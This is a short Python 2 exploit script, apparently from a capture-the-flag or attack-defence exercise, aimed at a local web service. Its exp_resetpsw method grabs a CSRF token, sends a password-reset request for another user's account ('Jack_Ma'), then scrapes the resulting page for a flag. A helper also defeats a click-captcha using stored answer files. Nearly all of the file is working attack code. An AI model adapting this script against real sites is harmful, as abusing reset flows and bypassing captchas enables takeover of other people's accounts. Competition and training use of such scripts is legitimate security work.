import re
import sys

import requests
import requests as req
from pyquery import PyQuery as PQ
import string
import random
import re


class WebChecker:

    def __init__(self, ip, port, csrfname = '_xsrf'):
        self.ip = ip
        self.port = port
        self.url = 'http://%s:%s/' % (ip, port)
        self.username = 'zx'
        self.password = 'zx'
        self.change_pass = '654321'
        self.mail = 'i@qvq.im'
        self.csrfname = csrfname
        self.integral = None
        self.session = req.session()


    def _generate_randstr(self, len = 10):
        return ''.join(random.sample(string.ascii_letters, len))



    def _get_uuid(self, html):
        dom = PQ(html)
        return dom('form canvas').attr('rel')

    def _get_answer(self, html):
        uuid = self._get_uuid(html)
        answer = {}
        with open('./ans/ans%s.txt' % uuid, 'r') as f:
            for line in f.readlines():
                if line != '\n':
                    ans = line.strip().split('=')
                    answer[ans[0].strip()] = ans[1].strip()
        x = random.randint(int(float(answer['ans_pos_x_1'])), int(float(answer['ans_width_x_1']) + float(answer['ans_pos_x_1'])))
        y = random.randint(int(float(answer['ans_pos_y_1'])), int(float(answer['ans_height_y_1']) + float(answer['ans_pos_y_1'])))
        return x,y



    def _get_user_integral(self):
        res = self.session.get(self.url + 'user')
        dom = PQ(res.text)
        res = dom('div.user-info').text()
        integral = re.search('(\d+\.\d+)', res).group()
        return integral



    def _get_token(self, html):
        dom = PQ(html)
        form = dom("form")
        token = str(PQ(form)("input[name=\"%s\"]" % self.csrfname).attr("value")).strip()
        return token

    def exp_resetpsw(self):

        res = self.session.get(self.url + 'pass/reset')
        html = res.text
        token = self._get_token(html)

        rs = self.session.post(self.url + 'pass/reset', data={
            self.csrfname: token,
            "username":"Jack_Ma"
        })

        res=self.session.get(self.url + 'user')
        dom = PQ(res.text)
        failed = dom('div')
        failed=PQ(failed).text().strip()

        flag=re.findall(r"flag=(.+?) if", failed)
        print flag


if __name__ == '__main__':
    ip = '127.0.0.1'
    port = 8233
    csrfname = '_xsrf'
    check = WebChecker(str(ip), str(port), csrfname)
    check.exp_resetpsw()

